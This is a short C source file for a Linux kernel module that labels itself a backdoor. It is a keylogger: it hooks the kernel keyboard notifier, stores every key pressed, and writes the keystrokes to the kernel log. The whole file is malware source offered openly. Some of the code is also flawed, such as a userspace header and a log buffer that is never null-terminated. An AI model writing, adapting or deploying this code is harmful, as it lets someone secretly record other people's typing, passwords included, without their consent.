#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>

#include <inttypes.h>
#include "backdoor.h"

static struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};

static char keystrokes[KEY_BUFFER_SIZE]; // Keyboard stroke buffer

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
    static int32_t buffer_count = 0; // Counts how many chars have been logged.
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        uint32_t keycode = param->value;
        char key = (char) keycode; // Convert keycode to char

        keystrokes[buffer_count] = key;
        buffer_count++;

        if (buffer_count == KEY_BUFFER_SIZE) {
            printk(KERN_INFO "Keys pressed: %s\n", keystrokes);
            buffer_count = 0;
        }
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}


static int __init keyboard_module_init(void) {
    int32_t result;

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_INFO "Backdoor module initialized\n");
    return 0;
}

static void __exit keyboard_module_exit(void) {
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);

    printk(KERN_INFO "Backdoor module exited\n");
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);
